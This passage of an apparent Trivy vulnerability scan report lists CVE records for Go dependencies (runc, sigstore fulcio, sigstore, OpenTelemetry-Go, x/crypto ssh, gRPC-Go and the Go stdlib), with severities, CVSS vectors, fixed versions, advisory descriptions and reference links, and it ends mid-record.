│     │      │                  ├ [10]: https://github.com/opencontainers/runc 
│     │      │                  ├ [11]: https://github.com/opencontainers/runc/blob/v1.4.0-rc.2/RELEASES.md 
│     │      │                  ├ [12]: https://github.com/opencontainers/runc/commit/3f925525b44d247e390e529e7
│     │      │                  │       72a0dc0c0bc3557 
│     │      │                  ├ [13]: https://github.com/opencontainers/runc/commit/435cc81be6b79cdec73b4002c
│     │      │                  │       0dae549b2f6ae6d 
│     │      │                  ├ [14]: https://github.com/opencontainers/runc/commit/44a0fcf685db051c80b8c2698
│     │      │                  │       12bb177f5802c58 
│     │      │                  ├ [15]: https://github.com/opencontainers/runc/commit/4b37cd93f86e72feac8664429
│     │      │                  │       88b549b5b7bf3e6 
│     │      │                  ├ [16]: https://github.com/opencontainers/runc/commit/6fc191449109ea14bb7d61238
│     │      │                  │       f24a33fe08c651f 
│     │      │                  ├ [17]: https://github.com/opencontainers/runc/commit/77889b56db939c323d29d1130
│     │      │                  │       f28f9aea2edb544 
│     │      │                  ├ [18]: https://github.com/opencontainers/runc/commit/77d217c7c3775d8ca5af89e47
│     │      │                  │       7e81568ef4572db 
│     │      │                  ├ [19]: https://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd354
│     │      │                  │       4e2801449697322 
│     │      │                  ├ [20]: https://github.com/opencontainers/runc/commit/b3dd1bc562ed9996d1a0f249e
│     │      │                  │       056c16624046d28 
│     │      │                  ├ [21]: https://github.com/opencontainers/runc/commit/d40b3439a9614a86e87b81a94
│     │      │                  │       c6811ec6fa2d7d2 
│     │      │                  ├ [22]: https://github.com/opencontainers/runc/commit/d61fd29d854b416feaaf128bf
│     │      │                  │       650325cd2182165 
│     │      │                  ├ [23]: https://github.com/opencontainers/runc/commit/db19bbed5348847da433faa9d
│     │      │                  │       69e9f90192bfa64 
│     │      │                  ├ [24]: https://github.com/opencontainers/runc/commit/ed6b1693b8b3ae7eb0250a7e7
│     │      │                  │       6fc888cdacf98c1 
│     │      │                  ├ [25]: https://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb9
│     │      │                  │       10a61aaa1ef47f3 
│     │      │                  ├ [26]: https://github.com/opencontainers/runc/commit/ff6fe1324663538167eca8b3d
│     │      │                  │       3eec61e1bd4fa51 
│     │      │                  ├ [27]: https://github.com/opencontainers/runc/commit/ff94f9991bd32076c871ef0ad
│     │      │                  │       8bc1b763458e480 
│     │      │                  ├ [28]: https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h2
│     │      │                  │       9p-rfm2 
│     │      │                  ├ [29]: https://github.com/opencontainers/runc/security/advisories/GHSA-cgrx-mc
│     │      │                  │       8f-2prm 
│     │      │                  ├ [30]: https://github.com/opencontainers/runc/security/advisories/GHSA-fh74-hm
│     │      │                  │       69-rqjw 
│     │      │                  ├ [31]: https://github.com/opencontainers/runc/security/advisories/GHSA-qw9x-cq
│     │      │                  │       r3-wc7r 
│     │      │                  ├ [32]: https://github.com/opencontainers/selinux/pull/237 
│     │      │                  ├ [33]: https://github.com/opencontainers/selinux/releases/tag/v1.13.0 
│     │      │                  ├ [34]: https://linux.oracle.com/cve/CVE-2025-52881.html 
│     │      │                  ├ [35]: https://linux.oracle.com/errata/ELSA-2025-23543.html 
│     │      │                  ├ [36]: https://nvd.nist.gov/vuln/detail/CVE-2025-52881 
│     │      │                  ├ [37]: https://pkg.go.dev/github.com/cyphar/filepath-securejoin/pathrs-lite/pr
│     │      │                  │       ocfs 
│     │      │                  ├ [38]: https://ubuntu.com/security/notices/USN-7851-1 
│     │      │                  ├ [39]: https://www.cve.org/CVERecord?id=CVE-2025-52881 
│     │      │                  ├ [40]: https://youtu.be/tGseJW_uBB8 
│     │      │                  ╰ [41]: https://youtu.be/y1PaBzxwRWQ 
│     │      ├ PublishedDate   : 2025-11-06T21:15:42.817Z 
│     │      ╰ LastModifiedDate: 2025-12-03T18:37:17.917Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2025-66506 
│     │      ├ VendorIDs        ─ [0]: GHSA-f83f-xpx7-ffpw 
│     │      ├ PkgID           : github.com/sigstore/fulcio@v1.7.1 
│     │      ├ PkgName         : github.com/sigstore/fulcio 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/fulcio@v1.7.1 
│     │      │                  ╰ UID : b4b2df00ae799d52 
│     │      ├ InstalledVersion: v1.7.1 
│     │      ├ FixedVersion    : 1.8.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-66506 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:4e17c55eb15d3ac8899cd1903d3aa3bd6573b921cc9f2c6bf5082adb82968827 
│     │      ├ Title           : github.com/sigstore/fulcio: Fulcio: Denial of Service via crafted OpenID
│     │      │                   Connect (OIDC) token 
│     │      ├ Description     : Fulcio is a free-to-use certificate authority for issuing code signing
│     │      │                   certificates for an OpenID Connect (OIDC) identity. Prior to 1.8.3, function
│     │      │                   identity.extractIssuerURL splits (via a call to strings.Split) its argument
│     │      │                   (which is untrusted data) on periods. As a result, in the face of a malicious
│     │      │                   request with an (invalid) OIDC identity token in the payload containing many
│     │      │                   period characters, a call to extractIssuerURL incurs allocations to the tune
│     │      │                   of O(n) bytes (where n stands for the length of the function's argument), with
│     │      │                    a constant factor of about 16. This vulnerability is fixed in 1.8.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-405 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-66506 
│     │      │                  ├ [1]: https://github.com/sigstore/fulcio 
│     │      │                  ├ [2]: https://github.com/sigstore/fulcio/commit/765a0e57608b9ef390e1eeeea8595b
│     │      │                  │      9054c63a5a 
│     │      │                  ├ [3]: https://github.com/sigstore/fulcio/security/advisories/GHSA-f83f-xpx7-ffpw 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-66506 
│     │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2025-66506 
│     │      ├ PublishedDate   : 2025-12-04T22:15:49.503Z 
│     │      ╰ LastModifiedDate: 2026-03-10T19:30:53.47Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-22772 
│     │      ├ VendorIDs        ─ [0]: GHSA-59jp-pj84-45mr 
│     │      ├ PkgID           : github.com/sigstore/fulcio@v1.7.1 
│     │      ├ PkgName         : github.com/sigstore/fulcio 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/fulcio@v1.7.1 
│     │      │                  ╰ UID : b4b2df00ae799d52 
│     │      ├ InstalledVersion: v1.7.1 
│     │      ├ FixedVersion    : 1.8.5 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-22772 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:5e2840984640dd8ec91b3bbb869900ecc8112c2e00b58ea60151f096d69ef5ac 
│     │      ├ Title           : fulcio: Fulcio: Server-Side Request Forgery (SSRF) via unanchored regex in
│     │      │                   MetaIssuer URL validation 
│     │      ├ Description     : Fulcio is a certificate authority for issuing code signing certificates for an
│     │      │                    OpenID Connect (OIDC) identity. Prior to 1.8.5, Fulcio's metaRegex() function
│     │      │                    uses unanchored regex, allowing attackers to bypass MetaIssuer URL validation
│     │      │                    and trigger SSRF to arbitrary internal services. Since the SSRF only can
│     │      │                   trigger GET requests, the request cannot mutate state. The response from the
│     │      │                   GET request is not returned to the caller so data exfiltration is not
│     │      │                   possible. A malicious actor could attempt to probe an internal network through
│     │      │                    Blind SSRF. This vulnerability is fixed in 1.8.5. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-918 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N 
│     │      │                           ╰ V3Score : 5.8 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-22772 
│     │      │                  ├ [1]: https://github.com/sigstore/fulcio 
│     │      │                  ├ [2]: https://github.com/sigstore/fulcio/commit/eaae2f2be56df9dea5f9b439ec81be
│     │      │                  │      dae4c0978d 
│     │      │                  ├ [3]: https://github.com/sigstore/fulcio/security/advisories/GHSA-59jp-pj84-45mr 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-22772 
│     │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-22772 
│     │      ├ PublishedDate   : 2026-01-12T21:15:59.457Z 
│     │      ╰ LastModifiedDate: 2026-03-05T13:48:17.443Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-24137 
│     │      ├ VendorIDs        ─ [0]: GHSA-fcv2-xgw5-pqxf 
│     │      ├ PkgID           : github.com/sigstore/sigstore@v1.9.5 
│     │      ├ PkgName         : github.com/sigstore/sigstore 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/sigstore@v1.9.5 
│     │      │                  ╰ UID : 115044d87d9a2201 
│     │      ├ InstalledVersion: v1.9.5 
│     │      ├ FixedVersion    : 1.10.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-24137 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:6acd91aeb9fb5ae71bd83d8a6cdaab44d6cbd946b9905e3f57a5a97793e1debd 
│     │      ├ Title           : github.com/sigstore/sigstore: sigstore legacy TUF client allows for arbitrary
│     │      │                   file writes with target cache path traversal 
│     │      ├ Description     : sigstore framework is a common go library shared across sigstore services and
│     │      │                   clients. In versions 1.10.3 and below, the legacy TUF client
│     │      │                   (pkg/tuf/client.go) supports caching target files to disk. It constructs a
│     │      │                   filesystem path by joining a cache base directory with a target name sourced
│     │      │                   from signed target metadata; however, it does not validate that the resulting
│     │      │                   path stays within the cache base directory. A malicious TUF repository can
│     │      │                   trigger arbitrary file overwriting, limited to the permissions that the
│     │      │                   calling process has. Note that this should only affect clients that are
│     │      │                   directly using the TUF client in sigstore/sigstore or are using an older
│     │      │                   version of Cosign. Public Sigstore deployment users are unaffected, as TUF
│     │      │                   metadata is validated by a quorum of trusted collaborators. This issue has
│     │      │                   been fixed in version 1.10.4. As a workaround, users can disable disk caching
│     │      │                   for the legacy client by setting SIGSTORE_NO_CACHE=true in the environment,
│     │      │                   migrate to https://github.com/sigstore/sigstore-go/tree/main/pkg/tuf, or
│     │      │                   upgrade to the latest sigstore/sigstore release. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-22 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N 
│     │      │                  │        ╰ V3Score : 5.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N 
│     │      │                           ╰ V3Score : 5.8 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-24137 
│     │      │                  ├ [1]: https://github.com/sigstore/sigstore 
│     │      │                  ├ [2]: https://github.com/sigstore/sigstore/commit/8ec410a2993ea78083aecf0e473a
│     │      │                  │      85453039496e 
│     │      │                  ├ [3]: https://github.com/sigstore/sigstore/releases/tag/v1.10.4 
│     │      │                  ├ [4]: https://github.com/sigstore/sigstore/security/advisories/GHSA-fcv2-xgw5-
│     │      │                  │      pqxf 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-24137 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2026-4358 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-24137 
│     │      ├ PublishedDate   : 2026-01-23T00:15:52.553Z 
│     │      ╰ LastModifiedDate: 2026-04-15T00:35:42.02Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-29181 
│     │      ├ VendorIDs        ─ [0]: GHSA-mh2q-q3fh-2475 
│     │      ├ PkgID           : go.opentelemetry.io/otel@v1.36.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel@v1.36.0 
│     │      │                  ╰ UID : 7e1e435d8d00526f 
│     │      ├ InstalledVersion: v1.36.0 
│     │      ├ FixedVersion    : 1.41.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-29181 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:c17595ea20f4139bf8c51bf7ef26ba62e2ca57f75c7a6a8faa79bad12fb7e43f 
│     │      ├ Title           : OpenTelemetry-Go: multi-value `baggage` header extraction causes excessive
│     │      │                   allocations (remote dos amplification) 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.36.0 to
│     │      │                   1.40.0, multi-value baggage: header extraction parses each header field-value
│     │      │                   independently and aggregates members across values. This allows an attacker to
│     │      │                    amplify cpu and allocations by sending many baggage: header lines, even when
│     │      │                   each individual value is within the 8192-byte per-value parse limit. This
│     │      │                   vulnerability is fixed in 1.41.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [1]: https://github.com/open-telemetry/opentelemetry-go/commit/aa1894e09e3fe6
│     │      │                  │      6860c7885cb40f98901b35277f 
│     │      │                  ├ [2]: https://github.com/open-telemetry/opentelemetry-go/pull/7880 
│     │      │                  ├ [3]: https://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.41.0 
│     │      │                  ├ [4]: https://github.com/open-telemetry/opentelemetry-go/security/advisories/G
│     │      │                  │      HSA-mh2q-q3fh-2475 
│     │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-29181 
│     │      ├ PublishedDate   : 2026-04-07T21:17:16.003Z 
│     │      ╰ LastModifiedDate: 2026-04-14T18:45:01.363Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2025-47914 
│     │      ├ VendorIDs        ─ [0]: GHSA-f6x5-jh6r-wrfv 
│     │      ├ PkgID           : golang.org/x/crypto@v0.43.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.43.0 
│     │      │                  ╰ UID : c72063bc54474d3d 
│     │      ├ InstalledVersion: v0.43.0 
│     │      ├ FixedVersion    : 0.45.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-47914 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:9fb5abc62f7f0c706553b09db79641178416e0324e146ecfba32a507d9556193 
│     │      ├ Title           : golang.org/x/crypto/ssh/agent: SSH Agent servers: Denial of Service due to
│     │      │                   malformed messages 
│     │      ├ Description     : SSH Agent servers do not validate the size of messages when processing new
│     │      │                   identity requests, which may cause the program to panic if the message is
│     │      │                   malformed due to an out of bounds read. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-125 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-47914 
│     │      │                  ├ [1]: https://go.dev/cl/721960 
│     │      │                  ├ [2]: https://go.dev/issue/76364 
│     │      │                  ├ [3]: https://go.googlesource.com/crypto 
│     │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/w-oX3UxNcZA 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-47914 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-4135 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-47914 
│     │      ├ PublishedDate   : 2025-11-19T21:15:50.517Z 
│     │      ╰ LastModifiedDate: 2025-12-11T19:36:41.373Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2025-58181 
│     │      ├ VendorIDs        ─ [0]: GHSA-j5w8-q4qc-rx2x 
│     │      ├ PkgID           : golang.org/x/crypto@v0.43.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.43.0 
│     │      │                  ╰ UID : c72063bc54474d3d 
│     │      ├ InstalledVersion: v0.43.0 
│     │      ├ FixedVersion    : 0.45.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58181 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:d3675f9495f1ccfa63ea604b9bae7be6c1fd9b34fe070cd09575463e58a7a576 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
│     │      │                   unbounded memory consumption in GSSAPI authentication 
│     │      ├ Description     : SSH servers parsing GSSAPI authentication requests do not validate the number
│     │      │                   of mechanisms specified in the request, allowing an attacker to cause
│     │      │                   unbounded memory consumption. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ redhat: 2 
│     │      │                  ╰ ubuntu: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-58181 
│     │      │                  ├ [1] : https://github.com/golang/crypto/commit/e79546e28b85ea53dd37afe1c410274
│     │      │                  │       6ef553b9c 
│     │      │                  ├ [2] : https://github.com/golang/go/issues/76363 
│     │      │                  ├ [3] : https://go.dev/cl/721961 
│     │      │                  ├ [4] : https://go.dev/issue/76363 
│     │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/w-oX3UxNcZA 
│     │      │                  ├ [6] : https://groups.google.com/g/golang-announce/c/w-oX3UxNcZA?pli=1 
│     │      │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
│     │      │                  ├ [8] : https://pkg.go.dev/vuln/GO-2025-4134 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-7956-1 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
│     │      ├ PublishedDate   : 2025-11-19T21:15:50.85Z 
│     │      ╰ LastModifiedDate: 2025-12-11T19:29:24.9Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-33186 
│     │      ├ VendorIDs        ─ [0]: GHSA-p77j-4mvh-x3m3 
│     │      ├ PkgID           : google.golang.org/grpc@v1.72.2 
│     │      ├ PkgName         : google.golang.org/grpc 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.72.2 
│     │      │                  ╰ UID : fa8c4e075dac94ca 
│     │      ├ InstalledVersion: v1.72.2 
│     │      ├ FixedVersion    : 1.79.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33186 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:cf5c155ca8329b1c50f943351bb763721bac1e06aed2d3b1a74e2cbc3b9e93b2 
│     │      ├ Title           : google.golang.org/grpc/grpc-go: google.golang.org/grpc/authz: gRPC-Go:
│     │      │                   Authorization bypass due to improper HTTP/2 path validation 
│     │      ├ Description     : gRPC-Go is the Go language implementation of gRPC. Versions prior to 1.79.3
│     │      │                   have an authorization bypass resulting from improper input validation of the
│     │      │                   HTTP/2 `:path` pseudo-header. The gRPC-Go server was too lenient in its
│     │      │                   routing logic, accepting requests where the `:path` omitted the mandatory
│     │      │                   leading slash (e.g., `Service/Method` instead of `/Service/Method`). While the
│     │      │                    server successfully routed these requests to the correct handler,
│     │      │                   authorization interceptors (including the official `grpc/authz` package)
│     │      │                   evaluated the raw, non-canonical path string. Consequently, "deny" rules
│     │      │                   defined using canonical paths (starting with `/`) failed to match the incoming
│     │      │                    request, allowing it to bypass the policy if a fallback "allow" rule was
│     │      │                   present. This affects gRPC-Go servers that use path-based authorization
│     │      │                   interceptors, such as the official RBAC implementation in
│     │      │                   `google.golang.org/grpc/authz` or custom interceptors relying on
│     │      │                   `info.FullMethod` or `grpc.Method(ctx)`; AND that have a security policy
│     │      │                   contains specific "deny" rules for canonical paths but allows other requests
│     │      │                   by default (a fallback "allow" rule). The vulnerability is exploitable by an
│     │      │                   attacker who can send raw HTTP/2 frames with malformed `:path` headers
│     │      │                   directly to the gRPC server. The fix in version 1.79.3 ensures that any
│     │      │                   request with a `:path` that does not start with a leading slash is immediately
│     │      │                    rejected with a `codes.Unimplemented` error, preventing it from reaching
│     │      │                   authorization interceptors or handlers with a non-canonical path string. While
│     │      │                    upgrading is the most secure and recommended path, users can mitigate the
│     │      │                   vulnerability using one of the following methods: Use a validating interceptor
│     │      │                    (recommended mitigation); infrastructure-level normalization; and/or policy
│     │      │                   hardening. 
│     │      ├ Severity        : CRITICAL 
│     │      ├ CweIDs           ─ [0]: CWE-285 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 4 
│     │      │                  ├ photon: 4 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 9.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 9.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33186 
│     │      │                  ├ [1]: https://github.com/grpc/grpc-go 
│     │      │                  ├ [2]: https://github.com/grpc/grpc-go/security/advisories/GHSA-p77j-4mvh-x3m3 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-33186 
│     │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-33186 
│     │      ├ PublishedDate   : 2026-03-20T23:16:45.18Z 
│     │      ╰ LastModifiedDate: 2026-04-10T20:49:17.737Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-32280 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4947 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7e6f4483e369d7c17520c04cc75630dc15e32796e6720d7e67df6a8dfdd05c06 
│     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
│     │      │                   certificate chain building 
│     │      ├ Description     : During chain building, the amount of work that is done is not correctly
│     │      │                   limited when a large number of intermediate certificates are passed in
│     │      │                   VerifyOptions.Intermediates, which can lead to a denial of service. This
│     │      │                   affects both direct users of crypto/x509 and users of crypto/tls. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
